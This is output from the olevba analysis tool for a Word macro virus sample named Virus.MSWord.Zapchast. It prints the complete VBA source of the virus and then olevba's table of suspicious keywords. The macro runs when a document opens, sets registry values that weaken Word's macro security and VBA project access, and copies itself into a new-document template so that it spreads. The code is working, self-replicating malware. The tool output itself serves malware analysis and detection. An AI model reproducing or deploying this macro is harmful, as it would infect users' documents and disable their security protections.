olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zapchast
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zapchast - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
A = Environ("windir") & "\ShellNew\Winword8.doc"
If Dir(A) <> "" Then
If Second(Now) Mod 2 = 0 Then
If Application.Version > 8 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "AccessVBOM") = 1&
ElseIf Application.Version = 8 Then
Options.VirusProtection = True 
End If
Set B = ThisDocument.VBProject.VBComponents(1).CodeModule
C = B.Lines(1, B.CountOfLines)
Set D = CreateObject("Word.Application")
D.Documents.Add
D.ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString C
D.ActiveDocument.SaveAs A, , , , 0
D.Quit
End If
End If
End Sub
'Transexual_Woman
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

